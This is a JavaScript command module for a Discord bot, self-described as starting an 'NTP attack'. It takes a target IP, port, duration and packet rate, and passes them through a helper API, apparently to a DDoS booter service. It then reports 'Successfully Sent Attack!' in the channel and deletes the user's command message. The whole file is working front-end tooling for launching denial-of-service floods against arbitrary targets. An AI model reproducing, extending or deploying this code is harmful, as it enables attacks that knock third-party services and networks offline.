const { MessageEmbed } = require('discord.js');
const Util = require('../../Util/API');
const util = new Util.default;

module.exports = {
    name: 'ntp',
    category: 'Utility',
    description: 'start an NTP attack',

    /**
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */

    run: async (client, message, args) => {
        const address = args[0]; // IP
        const port = args[1]; // PORT
        const time = args[2]; // TIME
        const pps = args[3]; // PowerPerSec

        /* checking to see if it's in the correct formatt */
        if (!address || !port || !time || !pps) return message.channel.send(new MessageEmbed()
            .setTitle(`❌ Error | \`Correct Usage: [IP] [PORT] [TIME] [PPS]\``)
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))


        /* checking if the port is a number and not a letter */
        if (isNaN(port)) return message.channel.send(new MessageEmbed()
            .setTitle("❌ Error | **\`Port must be a number\`**")
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))

        /* checking if the port is a number and not a letter */
        if (isNaN(time)) return message.channel.send(new MessageEmbed()
            .setTitle("❌ Error | **\`Time must be a number\`**")
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))

        /* checking if the pps is a number and not a letter */
        if (isNaN(pps)) return message.channel.send(new MessageEmbed()
            .setTitle("❌ Error | **\`PPS must be a number\`**")
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))


        /* checking the max time */
        if (time < 10 || time > 3600) return message.channel.send(new MessageEmbed()
            .setTitle("❌ Error | **Max Time \`[10 - 3600]\` **")
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))

        /* checking if the pps in range */
        if (pps < 10 || pps > 1000000) return message.channel.send(new MessageEmbed()
            .setTitle("❌ Error | **PPS: \`[10 - 1000000]\` **")
            .setColor(0xff0000)
            .setTimestamp()
            .setFooter(message.author.tag, message.member.user.displayAvatarURL())
        ).then(msg => msg.delete({ timeout: 20000 }).catch(e => console.log(e.message)))

        /* deletes the command after it gets sent */
        await message.delete()

        // sending please wait before the attack starts
        let msg = await message.channel.send(new MessageEmbed()
            .setColor(0xff1100)
            .setAuthor("**Sending attack ... Please wait**", "https://images-ext-1.discordapp.net/external/ANU162U1fDdmQhim_BcbQ3lf4dLaIQl7p0HcqzD5wJA/https/cdn.discordapp.com/emojis/756773010123522058.gif"));
        msg.delete({ timeout: 2000 }).catch(e => console.log(e.message))

        setTimeout(async () => {

            await util.requestAPI(address, port, time, 'NTP', pps); // ip, port, time, powerpersec, method
            return message.channel.send(new MessageEmbed()
                .setThumbnail(client.user.displayAvatarURL())
                .setColor(0xff1100)
                .addField("Successfully Sent Attack!", [
                    `> ❯ IP: **${address}**`,
                    `> ❯ Port: **${port}**`,
                    `> ❯ Time: **${time}**`,
                    `> ❯ PPS: **${pps}**`,
                    `> ❯ Method: **NTP**`
                ])
                .setFooter(message.author.tag, message.member.user.displayAvatarURL())
                .setTimestamp()
            )
        }, 3000)
    }
}